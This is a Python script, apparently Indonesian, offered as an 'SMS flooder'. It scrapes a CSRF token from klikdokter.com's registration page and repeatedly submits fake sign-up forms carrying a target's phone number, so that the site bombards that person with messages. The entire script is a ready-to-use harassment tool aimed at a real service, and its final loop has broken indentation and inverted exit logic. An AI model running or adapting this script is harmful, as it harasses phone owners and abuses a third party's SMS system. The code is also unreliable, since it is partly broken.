
import requests,os,sys,time
from bs4 import BeautifulSoup as BS

class docter:
	def __init__(self):
		self.ses=requests.Session()

	def klikdok(self,num):
		req1=self.ses.get('https://m.klikdokter.com/users/create')
		bs=BS(req1.text,'html.parser')
		token=bs.find('input',{'name':'_token'})['value']
#		print(token)

		head={
			'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Origin': 'https://m.klikdokter.com',
			'Upgrade-Insecure-Requests': '1',
			'Content-Type': 'application/x-www-form-urlencoded',
			'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Referer': 'https://m.klikdokter.com/users/create?back-to=',
		}
		ata={
			'_token':token,
			'full_name':'BambangSubianto',
			'email':'Hsjakaj@jskaka.com',
			'phone':num,
			'back-to':'',
			'submit':'Daftar',
		}

		req2=self.ses.post('https://m.klikdokter.com/users/check',headers=head,data=ata)
#		print(req2.url)
		if "sessions/auth?user=" in req2.url:
			print("SAVAGE :D")
		else:
			print("GAGAL TOTAL")

	
while True:
	try:
		os.system('clear')
		print("""
		[ - By. Ual_DaN - ]

[ List ]
1. SUPER SMS FLOODER
	""")
		pil=int(input("> Pilih: "))
		print("="*25)
		num=input("[?] Nomor Target(contoh:6287234568839): ")
		lop=int(input("[?] Kirim Berapa Kali: "))
		print()

		main=docter()
		if pil == 1:
			for i in range(lop):
				main.klikdok(num)
		else:
			print("?: Pilih Yang Bener Bjiir Awowkwowokk :D ")

		lgi=input("\n[?] Mau Coba Lagi Gak Maz Brow :D (y/n) ")
		if lgi.lower() == 'n':
                print(pil)
                else:
			sys.exit('By.WaLDaN_GOODBYE Maz Brow :v')
	except Exception as Err:
		sys.exit(Err)
